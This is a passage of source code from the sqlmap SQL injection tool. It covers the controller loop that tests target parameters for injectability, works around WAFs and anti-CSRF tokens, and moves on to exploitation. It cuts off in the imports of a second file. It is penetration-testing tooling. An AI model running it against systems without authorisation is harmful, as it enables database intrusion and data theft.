permission\n\"\"\"\n\nfrom __future__ import division\n\nimport os\nimport re\nimport subprocess\nimport time\n\nfrom lib.controller.action import action\nfrom lib.controller.checks import checkConnection\nfrom lib.controller.checks import checkDynParam\nfrom lib.controller.checks import checkInternet\nfrom lib.controller.checks import checkNullConnection\nfrom lib.controller.checks import checkSqlInjection\nfrom lib.controller.checks import checkStability\nfrom lib.controller.checks import checkWaf\nfrom lib.controller.checks import heuristicCheckSqlInjection\nfrom lib.core.agent import agent\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import extractRegexResult\nfrom lib.core.common import getFilteredPageContent\nfrom lib.core.common import getPublicTypeMembers\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import hashDBRetrieve\nfrom lib.core.common import hashDBWrite\nfrom lib.core.common import intersect\nfrom lib.core.common import isDigit\nfrom lib.core.common import isListLike\nfrom lib.core.common import parseTargetUrl\nfrom lib.core.common import popValue\nfrom lib.core.common import pushValue\nfrom lib.core.common import randomInt\nfrom lib.core.common import randomStr\nfrom lib.core.common import readInput\nfrom lib.core.common import removePostHintPrefix\nfrom lib.core.common import safeCSValue\nfrom lib.core.common import showHttpErrorCodes\nfrom lib.core.common import urldecode\nfrom lib.core.common import urlencode\nfrom lib.core.compat import xrange\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.decorators import stackedmethod\nfrom lib.core.enums import CONTENT_TYPE\nfrom lib.core.enums import HASHDB_KEYS\nfrom lib.core.enums import HEURISTIC_TEST\nfrom lib.core.enums import HTTP_HEADER\nfrom lib.core.enums import HTTPMETHOD\nfrom lib.core.enums import NOTE\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.enums import PLACE\nfrom lib.core.exception import SqlmapBaseException\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.core.exception import SqlmapNotVulnerableException\nfrom lib.core.exception import SqlmapSilentQuitException\nfrom lib.core.exception import SqlmapSkipTargetException\nfrom lib.core.exception import SqlmapSystemException\nfrom lib.core.exception import SqlmapUserQuitException\nfrom lib.core.exception import SqlmapValueException\nfrom lib.core.settings import ASP_NET_CONTROL_REGEX\nfrom lib.core.settings import CSRF_TOKEN_PARAMETER_INFIXES\nfrom lib.core.settings import DEFAULT_GET_POST_DELIMITER\nfrom lib.core.settings import EMPTY_FORM_FIELDS_REGEX\nfrom lib.core.settings import GOOGLE_ANALYTICS_COOKIE_PREFIX\nfrom lib.core.settings import HOST_ALIASES\nfrom lib.core.settings import IGNORE_PARAMETERS\nfrom lib.core.settings import LOW_TEXT_PERCENT\nfrom lib.core.settings import REFERER_ALIASES\nfrom lib.core.settings import USER_AGENT_ALIASES\nfrom lib.core.target import initTargetEnv\nfrom lib.core.target import setupTargetEnv\nfrom lib.utils.hash import crackHashFile\n\ndef _selectInjection():\n    \"\"\"\n    Selection function for injection place, parameters and type.\n    \"\"\"\n\n    points = {}\n\n    for injection in kb.injections:\n        place = injection.place\n        parameter = injection.parameter\n        ptype = injection.ptype\n\n        point = (place, parameter, ptype)\n\n        if point not in points:\n            points[point] = injection\n        else:\n            for key in points[point]:\n                if key != 'data':\n                    points[point][key] = points[point][key] or injection[key]\n            points[point]['data'].update(injection['data'])\n\n    if len(points) == 1:\n        kb.injection = kb.injections[0]\n\n    elif len(points) > 1:\n        message = \"there were multiple injection points, please select \"\n        message += \"the one to use for following injections:\\n\"\n\n        points = []\n\n        for i in xrange(0, len(kb.injections)):\n            place = kb.injections[i].place\n            parameter = kb.injections[i].parameter\n            ptype = kb.injections[i].ptype\n            point = (place, parameter, ptype)\n\n            if point not in points:\n                points.append(point)\n                ptype = PAYLOAD.PARAMETER[ptype] if isinstance(ptype, int) else ptype\n\n                message += \"[%d] place: %s, parameter: \" % (i, place)\n                message += \"%s, type: %s\" % (parameter, ptype)\n\n                if i == 0:\n                    message += \" (default)\"\n\n                message += \"\\n\"\n\n        message += \"[q] Quit\"\n        choice = readInput(message, default='0').upper()\n\n        if isDigit(choice) and int(choice) < len(kb.injections) and int(choice) >= 0:\n            index = int(choice)\n        elif choice == 'Q':\n            raise SqlmapUserQuitException\n        else:\n            errMsg = \"invalid choice\"\n            raise SqlmapValueException(errMsg)\n\n        kb.injection = kb.injections[index]\n\ndef _formatInjection(inj):\n    paramType = conf.method if conf.method not in (None, HTTPMETHOD.GET, HTTPMETHOD.POST) else inj.place\n    data = \"Parameter: %s (%s)\\n\" % (inj.parameter, paramType)\n\n    for stype, sdata in inj.data.items():\n        title = sdata.title\n        vector = sdata.vector\n        comment = sdata.comment\n        payload = agent.adjustLateValues(sdata.payload)\n        if inj.place == PLACE.CUSTOM_HEADER:\n            payload = payload.split(',', 1)[1]\n        if stype == PAYLOAD.TECHNIQUE.UNION:\n            count = re.sub(r\"(?i)(\\(.+\\))|(\\blimit[^a-z]+)\", \"\", sdata.payload).count(',') + 1\n            title = re.sub(r\"\\d+ to \\d+\", str(count), title)\n            vector = agent.forgeUnionQuery(\"[QUERY]\", vector[0], vector[1], vector[2], None, None, vector[5], vector[6])\n            if count == 1:\n                title = title.replace(\"columns\", \"column\")\n        elif comment:\n            vector = \"%s%s\" % (vector, comment)\n        data += \"    Type: %s\\n\" % PAYLOAD.SQLINJECTION[stype]\n        data += \"    Title: %s\\n\" % title\n        data += \"    Payload: %s\\n\" % urldecode(payload, unsafe=\"&\", spaceplus=(inj.place != PLACE.GET and kb.postSpaceToPlus))\n        data += \"    Vector: %s\\n\\n\" % vector if conf.verbose > 1 else \"\\n\"\n\n    return data\n\ndef _showInjections():\n    if conf.wizard and kb.wizardMode:\n        kb.wizardMode = False\n\n    if kb.testQueryCount > 0:\n        header = \"sqlmap identified the following injection point(s) with \"\n        header += \"a total of %d HTTP(s) requests\" % kb.testQueryCount\n    else:\n        header = \"sqlmap resumed the following injection point(s) from stored session\"\n\n    if conf.api:\n        conf.dumper.string(\"\", {\"url\": conf.url, \"query\": conf.parameters.get(PLACE.GET), \"data\": conf.parameters.get(PLACE.POST)}, content_type=CONTENT_TYPE.TARGET)\n        conf.dumper.string(\"\", kb.injections, content_type=CONTENT_TYPE.TECHNIQUES)\n    else:\n        data = \"\".join(set(_formatInjection(_) for _ in kb.injections)).rstrip(\"\\n\")\n        conf.dumper.string(header, data)\n\n    if conf.tamper:\n        warnMsg = \"changes made by tampering scripts are not \"\n        warnMsg += \"included in shown payload content(s)\"\n        logger.warning(warnMsg)\n\n    if conf.hpp:\n        warnMsg = \"changes made by HTTP parameter pollution are not \"\n        warnMsg += \"included in shown payload content(s)\"\n        logger.warning(warnMsg)\n\ndef _randomFillBlankFields(value):\n    retVal = value\n\n    if extractRegexResult(EMPTY_FORM_FIELDS_REGEX, value):\n        message = \"do you want to fill blank fields with random values? [Y/n] \"\n\n        if readInput(message, default='Y', boolean=True):\n            for match in re.finditer(EMPTY_FORM_FIELDS_REGEX, retVal):\n                item = match.group(\"result\")\n                if not any(_ in item for _ in IGNORE_PARAMETERS) and not re.search(ASP_NET_CONTROL_REGEX, item):\n                    newValue = randomStr() if not re.search(r\"^id|id$\", item, re.I) else randomInt()\n                    if item[-1] == DEFAULT_GET_POST_DELIMITER:\n                        retVal = retVal.replace(item, \"%s%s%s\" % (item[:-1], newValue, DEFAULT_GET_POST_DELIMITER))\n                    else:\n                        retVal = retVal.replace(item, \"%s%s\" % (item, newValue))\n\n    return retVal\n\ndef _saveToHashDB():\n    injections = hashDBRetrieve(HASHDB_KEYS.KB_INJECTIONS, True)\n    if not isListLike(injections):\n        injections = []\n    injections.extend(_ for _ in kb.injections if _ and _.place is not None and _.parameter is not None)\n\n    _ = dict()\n    for injection in injections:\n        key = (injection.place, injection.parameter, injection.ptype)\n        if key not in _:\n            _[key] = injection\n        else:\n            _[key].data.update(injection.data)\n    hashDBWrite(HASHDB_KEYS.KB_INJECTIONS, list(_.values()), True)\n\n    _ = hashDBRetrieve(HASHDB_KEYS.KB_ABS_FILE_PATHS, True)\n    hashDBWrite(HASHDB_KEYS.KB_ABS_FILE_PATHS, kb.absFilePaths | (_ if isinstance(_, set) else set()), True)\n\n    if not hashDBRetrieve(HASHDB_KEYS.KB_CHARS):\n        hashDBWrite(HASHDB_KEYS.KB_CHARS, kb.chars, True)\n\n    if not hashDBRetrieve(HASHDB_KEYS.KB_DYNAMIC_MARKINGS):\n        hashDBWrite(HASHDB_KEYS.KB_DYNAMIC_MARKINGS, kb.dynamicMarkings, True)\n\ndef _saveToResultsFile():\n    if not conf.resultsFP:\n        return\n\n    results = {}\n    techniques = dict((_[1], _[0]) for _ in getPublicTypeMembers(PAYLOAD.TECHNIQUE))\n\n    for injection in kb.injections + kb.falsePositives:\n        if injection.place is None or injection.parameter is None:\n            continue\n\n        key = (injection.place, injection.parameter, ';'.join(injection.notes))\n        if key not in results:\n            results[key] = []\n\n        results[key].extend(list(injection.data.keys()))\n\n    try:\n        for key, value in results.items():\n            place, parameter, notes = key\n            line = \"%s,%s,%s,%s,%s%s\" % (safeCSValue(kb.originalUrls.get(conf.url) or conf.url), place, parameter, \"\".join(techniques[_][0].upper() for _ in sorted(value)), notes, os.linesep)\n            conf.resultsFP.write(line)\n\n        conf.resultsFP.flush()\n    except IOError as ex:\n        errMsg = \"unable to write to the results file '%s' ('%s'). \" % (conf.resultsFile, getSafeExString(ex))\n        raise SqlmapSystemException(errMsg)\n\n@stackedmethod\ndef start():\n    \"\"\"\n    This function calls a function that performs checks on both URL\n    stability and all GET, POST, Cookie and User-Agent parameters to\n    check if they are dynamic and SQL injection affected\n    \"\"\"\n\n    if conf.hashFile:\n        crackHashFile(conf.hashFile)\n\n    if conf.direct:\n        initTargetEnv()\n        setupTargetEnv()\n        action()\n        return True\n\n    if conf.url and not any((conf.forms, conf.crawlDepth)):\n        kb.targets.add((conf.url, conf.method, conf.data, conf.cookie, None))\n\n    if conf.configFile and not kb.targets:\n        errMsg = \"you did not edit the configuration file properly, set \"\n        errMsg += \"the target URL, list of targets or google dork\"\n        logger.error(errMsg)\n        return False\n\n    if kb.targets and isListLike(kb.targets) and len(kb.targets) > 1:\n        infoMsg = \"found a total of %d targets\" % len(kb.targets)\n        logger.info(infoMsg)\n\n    targetCount = 0\n    initialHeaders = list(conf.httpHeaders)\n\n    for targetUrl, targetMethod, targetData, targetCookie, targetHeaders in kb.targets:\n        targetCount += 1\n\n        try:\n            if conf.checkInternet:\n                infoMsg = \"checking for Internet connection\"\n                logger.info(infoMsg)\n\n                if not checkInternet():\n                    warnMsg = \"[%s] [WARNING] no connection detected\" % time.strftime(\"%X\")\n                    dataToStdout(warnMsg)\n\n                    valid = False\n                    for _ in xrange(conf.retries):\n                        if checkInternet():\n                            valid = True\n                            break\n                        else:\n                            dataToStdout('.')\n                            time.sleep(5)\n\n                    if not valid:\n                        errMsg = \"please check your Internet connection and rerun\"\n                        raise SqlmapConnectionException(errMsg)\n                    else:\n                        dataToStdout(\"\\n\")\n\n            conf.url = targetUrl\n            conf.method = targetMethod.upper().strip() if targetMethod else targetMethod\n            conf.data = targetData\n            conf.cookie = targetCookie\n            conf.httpHeaders = list(initialHeaders)\n            conf.httpHeaders.extend(targetHeaders or [])\n\n            if conf.randomAgent or conf.mobile:\n                for header, value in initialHeaders:\n                    if header.upper() == HTTP_HEADER.USER_AGENT.upper():\n                        conf.httpHeaders.append((header, value))\n                        break\n\n            if conf.data:\n                # Note: explicitly URL encode __ ASP(.NET) parameters (e.g. to avoid problems with Base64 encoded '+' character) - standard procedure in web browsers\n                conf.data = re.sub(r\"\\b(__\\w+)=([^&]+)\", lambda match: \"%s=%s\" % (match.group(1), urlencode(match.group(2), safe='%')), conf.data)\n\n            conf.httpHeaders = [conf.httpHeaders[i] for i in xrange(len(conf.httpHeaders)) if conf.httpHeaders[i][0].upper() not in (__[0].upper() for __ in conf.httpHeaders[i + 1:])]\n\n            initTargetEnv()\n            parseTargetUrl()\n\n            testSqlInj = False\n\n            if PLACE.GET in conf.parameters and not any((conf.data, conf.testParameter)):\n                for parameter in re.findall(r\"([^=]+)=([^%s]+%s?|\\Z)\" % (re.escape(conf.paramDel or \"\") or DEFAULT_GET_POST_DELIMITER, re.escape(conf.paramDel or \"\") or DEFAULT_GET_POST_DELIMITER), conf.parameters[PLACE.GET]):\n                    paramKey = (conf.hostname, conf.path, PLACE.GET, parameter[0])\n\n                    if paramKey not in kb.testedParams:\n                        testSqlInj = True\n                        break\n            else:\n                paramKey = (conf.hostname, conf.path, None, None)\n                if paramKey not in kb.testedParams:\n                    testSqlInj = True\n\n            if testSqlInj and conf.hostname in kb.vulnHosts:\n                if kb.skipVulnHost is None:\n                    message = \"SQL injection vulnerability has already been detected \"\n                    message += \"against '%s'. Do you want to skip \" % conf.hostname\n                    message += \"further tests involving it? [Y/n]\"\n\n                    kb.skipVulnHost = readInput(message, default='Y', boolean=True)\n\n                testSqlInj = not kb.skipVulnHost\n\n            if not testSqlInj:\n                infoMsg = \"skipping '%s'\" % targetUrl\n                logger.info(infoMsg)\n                continue\n\n            if conf.multipleTargets:\n                if conf.forms and conf.method:\n                    message = \"[%d/%s] Form:\\n%s %s\" % (targetCount, len(kb.targets) if isListLike(kb.targets) else '?', conf.method, targetUrl)\n                else:\n                    message = \"[%d/%s] URL:\\n%s %s\" % (targetCount, len(kb.targets) if isListLike(kb.targets) else '?', HTTPMETHOD.GET, targetUrl)\n\n                if conf.cookie:\n                    message += \"\\nCookie: %s\" % conf.cookie\n\n                if conf.data is not None:\n                    message += \"\\n%s data: %s\" % ((conf.method if conf.method != HTTPMETHOD.GET else None) or HTTPMETHOD.POST, urlencode(conf.data or \"\") if re.search(r\"\\A\\s*[<{]\", conf.data or \"\") is None else conf.data)\n\n                if conf.forms and conf.method:\n                    if conf.method == HTTPMETHOD.GET and targetUrl.find(\"?\") == -1:\n                        continue\n\n                    message += \"\\ndo you want to test this form? [Y/n/q] \"\n                    choice = readInput(message, default='Y').upper()\n\n                    if choice == 'N':\n                        continue\n                    elif choice == 'Q':\n                        break\n                    else:\n                        if conf.method != HTTPMETHOD.GET:\n                            message = \"Edit %s data [default: %s]%s: \" % (conf.method, urlencode(conf.data or \"\") if re.search(r\"\\A\\s*[<{]\", conf.data or \"None\") is None else conf.data, \" (Warning: blank fields detected)\" if conf.data and extractRegexResult(EMPTY_FORM_FIELDS_REGEX, conf.data) else \"\")\n                            conf.data = readInput(message, default=conf.data)\n                            conf.data = _randomFillBlankFields(conf.data)\n                            conf.data = urldecode(conf.data) if conf.data and urlencode(DEFAULT_GET_POST_DELIMITER, None) not in conf.data else conf.data\n\n                        else:\n                            if '?' in targetUrl:\n                                firstPart, secondPart = targetUrl.split('?', 1)\n                                message = \"Edit GET data [default: %s]: \" % secondPart\n                                test = readInput(message, default=secondPart)\n                                test = _randomFillBlankFields(test)\n                                conf.url = \"%s?%s\" % (firstPart, test)\n\n                        parseTargetUrl()\n\n                else:\n                    if not conf.scope:\n                        message += \"\\ndo you want to test this URL? [Y/n/q]\"\n                        choice = readInput(message, default='Y').upper()\n\n                        if choice == 'N':\n                            dataToStdout(os.linesep)\n                            continue\n                        elif choice == 'Q':\n                            break\n                    else:\n                        pass\n\n                    infoMsg = \"testing URL '%s'\" % targetUrl\n                    logger.info(infoMsg)\n\n            setupTargetEnv()\n\n            if not checkConnection(suppressOutput=conf.forms):\n                continue\n\n            if conf.rParam and kb.originalPage:\n                kb.randomPool = dict([_ for _ in kb.randomPool.items() if isinstance(_[1], list)])\n\n                for match in re.finditer(r\"(?si)<select[^>]+\\bname\\s*=\\s*[\\\"']([^\\\"']+)(.+?)</select>\", kb.originalPage):\n                    name, _ = match.groups()\n                    options = tuple(re.findall(r\"<option[^>]+\\bvalue\\s*=\\s*[\\\"']([^\\\"']+)\", _))\n                    if options:\n                        kb.randomPool[name] = options\n\n            checkWaf()\n\n            if conf.nullConnection:\n                checkNullConnection()\n\n            if (len(kb.injections) == 0 or (len(kb.injections) == 1 and kb.injections[0].place is None)) and (kb.injection.place is None or kb.injection.parameter is None):\n                if not any((conf.string, conf.notString, conf.regexp)) and PAYLOAD.TECHNIQUE.BOOLEAN in conf.technique:\n                    # NOTE: this is not needed anymore, leaving only to display\n                    # a warning message to the user in case the page is not stable\n                    checkStability()\n\n                # Do a little prioritization reorder of a testable parameter list\n                parameters = list(conf.parameters.keys())\n\n                # Order of testing list (first to last)\n                orderList = (PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER, PLACE.URI, PLACE.POST, PLACE.GET)\n\n                for place in orderList[::-1]:\n                    if place in parameters:\n                        parameters.remove(place)\n                        parameters.insert(0, place)\n\n                proceed = True\n                for place in parameters:\n                    # Test User-Agent and Referer headers only if\n                    # --level >= 3\n                    skip = (place == PLACE.USER_AGENT and (kb.testOnlyCustom or conf.level < 3))\n                    skip |= (place == PLACE.REFERER and (kb.testOnlyCustom or conf.level < 3))\n\n                    # --param-filter\n                    skip |= (len(conf.paramFilter) > 0 and place.upper() not in conf.paramFilter)\n\n                    # Test Host header only if\n                    # --level >= 5\n                    skip |= (place == PLACE.HOST and (kb.testOnlyCustom or conf.level < 5))\n\n                    # Test Cookie header only if --level >= 2\n                    skip |= (place == PLACE.COOKIE and (kb.testOnlyCustom or conf.level < 2))\n\n                    skip |= (place == PLACE.USER_AGENT and intersect(USER_AGENT_ALIASES, conf.skip, True) not in ([], None))\n                    skip |= (place == PLACE.REFERER and intersect(REFERER_ALIASES, conf.skip, True) not in ([], None))\n                    skip |= (place == PLACE.COOKIE and intersect(PLACE.COOKIE, conf.skip, True) not in ([], None))\n                    skip |= (place == PLACE.HOST and intersect(PLACE.HOST, conf.skip, True) not in ([], None))\n\n                    skip &= not (place == PLACE.USER_AGENT and intersect(USER_AGENT_ALIASES, conf.testParameter, True))\n                    skip &= not (place == PLACE.REFERER and intersect(REFERER_ALIASES, conf.testParameter, True))\n                    skip &= not (place == PLACE.HOST and intersect(HOST_ALIASES, conf.testParameter, True))\n                    skip &= not (place == PLACE.COOKIE and intersect((PLACE.COOKIE,), conf.testParameter, True))\n\n                    if skip:\n                        continue\n\n                    if place not in conf.paramDict or place not in conf.parameters:\n                        continue\n\n                    paramDict = conf.paramDict[place]\n\n                    paramType = conf.method if conf.method not in (None, HTTPMETHOD.GET, HTTPMETHOD.POST) else place\n\n                    for parameter, value in paramDict.items():\n                        if not proceed:\n                            break\n\n                        kb.vainRun = False\n                        testSqlInj = True\n                        paramKey = (conf.hostname, conf.path, place, parameter)\n\n                        if kb.processUserMarks:\n                            if testSqlInj and place not in (PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER, PLACE.URI):\n                                if kb.processNonCustom is None:\n                                    message = \"other non-custom parameters found. \"\n                                    message += \"Do you want to process them too? [Y/n/q] \"\n                                    choice = readInput(message, default='Y').upper()\n\n                                    if choice == 'Q':\n                                        raise SqlmapUserQuitException\n                                    else:\n                                        kb.processNonCustom = choice == 'Y'\n\n                                if not kb.processNonCustom:\n                                    infoMsg = \"skipping %sparameter '%s'\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter)\n                                    logger.info(infoMsg)\n                                    continue\n\n                        if paramKey in kb.testedParams:\n                            testSqlInj = False\n\n                            infoMsg = \"skipping previously processed %sparameter '%s'\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter)\n                            logger.info(infoMsg)\n\n                        elif any(_ in conf.testParameter for _ in (parameter, removePostHintPrefix(parameter))):\n                            pass\n\n                        elif parameter in conf.rParam:\n                            testSqlInj = False\n\n                            infoMsg = \"skipping randomizing %sparameter '%s'\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter)\n                            logger.info(infoMsg)\n\n                        elif parameter in conf.skip or kb.postHint and parameter.split(' ')[-1] in conf.skip:\n                            testSqlInj = False\n\n                            infoMsg = \"skipping %sparameter '%s'\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter)\n                            logger.info(infoMsg)\n\n                        elif conf.paramExclude and (re.search(conf.paramExclude, parameter, re.I) or kb.postHint and re.search(conf.paramExclude, parameter.split(' ')[-1], re.I) or re.search(conf.paramExclude, place, re.I)):\n                            testSqlInj = False\n\n                            infoMsg = \"skipping %sparameter '%s'\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter)\n                            logger.info(infoMsg)\n\n                        elif conf.csrfToken and re.search(conf.csrfToken, parameter, re.I):\n                            testSqlInj = False\n\n                            infoMsg = \"skipping anti-CSRF token parameter '%s'\" % parameter\n                            logger.info(infoMsg)\n\n                        # Ignore session-like parameters for --level < 4\n                        elif conf.level < 4 and (parameter.upper() in IGNORE_PARAMETERS or any(_ in parameter.lower() for _ in CSRF_TOKEN_PARAMETER_INFIXES) or parameter.upper().startswith(GOOGLE_ANALYTICS_COOKIE_PREFIX)):\n                            testSqlInj = False\n\n                            infoMsg = \"ignoring %sparameter '%s'\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter)\n                            logger.info(infoMsg)\n\n                        elif PAYLOAD.TECHNIQUE.BOOLEAN in conf.technique or conf.skipStatic:\n                            check = checkDynParam(place, parameter, value)\n\n                            if not check:\n                                warnMsg = \"%sparameter '%s' does not appear to be dynamic\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter)\n                                logger.warning(warnMsg)\n\n                                if conf.skipStatic:\n                                    infoMsg = \"skipping static %sparameter '%s'\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter)\n                                    logger.info(infoMsg)\n\n                                    testSqlInj = False\n                            else:\n                                infoMsg = \"%sparameter '%s' appears to be dynamic\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter)\n                                logger.info(infoMsg)\n\n                        kb.testedParams.add(paramKey)\n\n                        if testSqlInj:\n                            try:\n                                if place == PLACE.COOKIE:\n                                    pushValue(kb.mergeCookies)\n                                    kb.mergeCookies = False\n\n                                check = heuristicCheckSqlInjection(place, parameter)\n\n                                if check != HEURISTIC_TEST.POSITIVE:\n                                    if conf.smart or (kb.ignoreCasted and check == HEURISTIC_TEST.CASTED):\n                                        infoMsg = \"skipping %sparameter '%s'\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter)\n                                        logger.info(infoMsg)\n                                        continue\n\n                                infoMsg = \"testing for SQL injection on %sparameter '%s'\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter)\n                                logger.info(infoMsg)\n\n                                injection = checkSqlInjection(place, parameter, value)\n                                proceed = not kb.endDetection\n                                injectable = False\n\n                                if getattr(injection, \"place\", None) is not None:\n                                    if NOTE.FALSE_POSITIVE_OR_UNEXPLOITABLE in injection.notes:\n                                        kb.falsePositives.append(injection)\n                                    else:\n                                        injectable = True\n\n                                        kb.injections.append(injection)\n\n                                        if not kb.alerted:\n                                            if conf.alert:\n                                                infoMsg = \"executing alerting shell command(s) ('%s')\" % conf.alert\n                                                logger.info(infoMsg)\n                                                try:\n                                                    process = subprocess.Popen(conf.alert, shell=True)\n                                                    process.wait()\n                                                except Exception as ex:\n                                                    errMsg = \"error occurred while executing '%s' ('%s')\" % (conf.alert, getSafeExString(ex))\n                                                    logger.error(errMsg)\n\n                                            kb.alerted = True\n\n                                        # In case when user wants to end detection phase (Ctrl+C)\n                                        if not proceed:\n                                            break\n\n                                        msg = \"%sparameter '%s' \" % (\"%s \" % injection.place if injection.place != injection.parameter else \"\", injection.parameter)\n                                        msg += \"is vulnerable. Do you want to keep testing the others (if any)? [y/N] \"\n\n                                        if not readInput(msg, default='N', boolean=True):\n                                            proceed = False\n                                            paramKey = (conf.hostname, conf.path, None, None)\n                                            kb.testedParams.add(paramKey)\n\n                                if not injectable:\n                                    warnMsg = \"%sparameter '%s' does not seem to be injectable\" % (\"%s \" % paramType if paramType != parameter else \"\", parameter)\n                                    logger.warning(warnMsg)\n\n                            finally:\n                                if place == PLACE.COOKIE:\n                                    kb.mergeCookies = popValue()\n\n            if len(kb.injections) == 0 or (len(kb.injections) == 1 and kb.injections[0].place is None):\n                if kb.vainRun and not conf.multipleTargets:\n                    errMsg = \"no parameter(s) found for testing in the provided data \"\n                    errMsg += \"(e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')\"\n                    if kb.originalPage:\n                        advice = []\n                        if not conf.forms and re.search(r\"<form\", kb.originalPage) is not None:\n                            advice.append(\"--forms\")\n                        if not conf.crawlDepth and re.search(r\"href=[\\\"']/?\\w\", kb.originalPage) is not None:\n                            advice.append(\"--crawl=2\")\n                        if advice:\n                            errMsg += \". You are advised to rerun with '%s'\" % ' '.join(advice)\n                    raise SqlmapNoneDataException(errMsg)\n                else:\n                    errMsg = \"all tested parameters do not appear to be injectable.\"\n\n                    if conf.level < 5 or conf.risk < 3:\n                        errMsg += \" Try to increase values for '--level'/'--risk' options \"\n                        errMsg += \"if you wish to perform more tests.\"\n\n                    if isinstance(conf.technique, list) and len(conf.technique) < 5:\n                        errMsg += \" Rerun without providing the option '--technique'.\"\n\n                    if not conf.textOnly and kb.originalPage:\n                        percent = (100.0 * len(getFilteredPageContent(kb.originalPage)) / len(kb.originalPage))\n\n                        if kb.dynamicMarkings:\n                            errMsg += \" You can give it a go with the switch '--text-only' \"\n                            errMsg += \"if the target page has a low percentage \"\n                            errMsg += \"of textual content (~%.2f%% of \" % percent\n                            errMsg += \"page content is text).\"\n                        elif percent < LOW_TEXT_PERCENT and not kb.errorIsNone:\n                            errMsg += \" Please retry with the switch '--text-only' \"\n                            errMsg += \"(along with --technique=BU) as this case \"\n                            errMsg += \"looks like a perfect candidate \"\n                            errMsg += \"(low textual content along with inability \"\n                            errMsg += \"of comparison engine to detect at least \"\n                            errMsg += \"one dynamic parameter).\"\n\n                    if kb.heuristicTest == HEURISTIC_TEST.POSITIVE:\n                        errMsg += \" As heuristic test turned out positive you are \"\n                        errMsg += \"strongly advised to continue on with the tests.\"\n\n                    if conf.string:\n                        errMsg += \" Also, you can try to rerun by providing a \"\n                        errMsg += \"valid value for option '--string' as perhaps the string you \"\n                        errMsg += \"have chosen does not match \"\n                        errMsg += \"exclusively True responses.\"\n                    elif conf.regexp:\n                        errMsg += \" Also, you can try to rerun by providing a \"\n                        errMsg += \"valid value for option '--regexp' as perhaps the regular \"\n                        errMsg += \"expression that you have chosen \"\n                        errMsg += \"does not match exclusively True responses.\"\n\n                    if not conf.tamper:\n                        errMsg += \" If you suspect that there is some kind of protection mechanism \"\n                        errMsg += \"involved (e.g. WAF) maybe you could try to use \"\n                        errMsg += \"option '--tamper' (e.g. '--tamper=space2comment')\"\n\n                        if not conf.randomAgent:\n                            errMsg += \" and/or switch '--random-agent'\"\n\n                    raise SqlmapNotVulnerableException(errMsg.rstrip('.'))\n            else:\n                # Flush the flag\n                kb.testMode = False\n\n                _saveToResultsFile()\n                _saveToHashDB()\n                _showInjections()\n                _selectInjection()\n\n            if kb.injection.place is not None and kb.injection.parameter is not None:\n                if conf.multipleTargets:\n                    message = \"do you want to exploit this SQL injection? [Y/n] \"\n                    condition = readInput(message, default='Y', boolean=True)\n                else:\n                    condition = True\n\n                if condition:\n                    action()\n\n        except KeyboardInterrupt:\n            if kb.lastCtrlCTime and (time.time() - kb.lastCtrlCTime < 1):\n                kb.multipleCtrlC = True\n                raise SqlmapUserQuitException(\"user aborted (Ctrl+C was pressed multiple times)\")\n\n            kb.lastCtrlCTime = time.time()\n\n            if conf.multipleTargets:\n                warnMsg = \"user aborted in multiple target mode\"\n                logger.warning(warnMsg)\n\n                message = \"do you want to skip to the next target in list? [Y/n/q]\"\n                choice = readInput(message, default='Y').upper()\n\n                if choice == 'N':\n                    return False\n                elif choice == 'Q':\n                    raise SqlmapUserQuitException\n            else:\n                raise\n\n        except SqlmapSkipTargetException:\n            pass\n\n        except SqlmapUserQuitException:\n            raise\n\n        except SqlmapSilentQuitException:\n            raise\n\n        except SqlmapBaseException as ex:\n            errMsg = getSafeExString(ex)\n\n            if conf.multipleTargets:\n                _saveToResultsFile()\n\n                errMsg += \", skipping to the next target\"\n                logger.error(errMsg.lstrip(\", \"))\n            else:\n                logger.critical(errMsg)\n                return False\n\n        finally:\n            showHttpErrorCodes()\n\n            if kb.maxConnectionsFlag:\n                warnMsg = \"it appears that the target \"\n                warnMsg += \"has a maximum connections \"\n                warnMsg += \"constraint\"\n                logger.warning(warnMsg)\n\n    if kb.dataOutputFlag and not conf.multipleTargets:\n        logger.info(\"fetched data logged to text files under '%s'\" % conf.outputPath)\n\n    if conf.multipleTargets:\n        if conf.resultsFile:\n            infoMsg = \"you can find results of scanning in multiple targets \"\n            infoMsg += \"mode inside the CSV file '%s'\" % conf.resultsFile\n            logger.info(infoMsg)\n\n    return True\n", "lib/controller/checks.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport copy\nimport logging\nimport random\nimport re\nimport socket\nimport time\n\nfrom extra.beep.beep import beep\nfrom lib.core.agent import agent\nfrom lib.core.common import Backend\nfrom lib.core.common import extractRegexResult\nfrom lib.core.common import extractTextTagContent\nfrom lib.core.common import filterNone\nfrom lib.core.common import findDynamicContent\nfrom lib.core.common import Format\nfrom lib.core.common import getFilteredPageContent\nfrom lib.core.common import getLastRequestHTTPError\nfrom lib.core.common import getPublicTypeMembers\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import getSortedInjectionTests\nfrom lib.core.common import hashDBRetrieve\nfrom lib.core.common import hashDBWrite\nfrom lib.core.common import intersect\nfrom lib.core.common import isDigit\nfrom lib.core.common import joinValue\nfrom lib.core.common import listToStrValue\nfrom lib.core.common import parseFilePaths\nfrom lib.core.common import popValue\nfrom lib.core.common import pushValue\nfrom lib.core.common import randomInt\nfrom lib.core.common import randomStr\nfrom lib.core.common import readInput\nfrom lib.core.common import showStaticWords\nfrom lib.core.common import 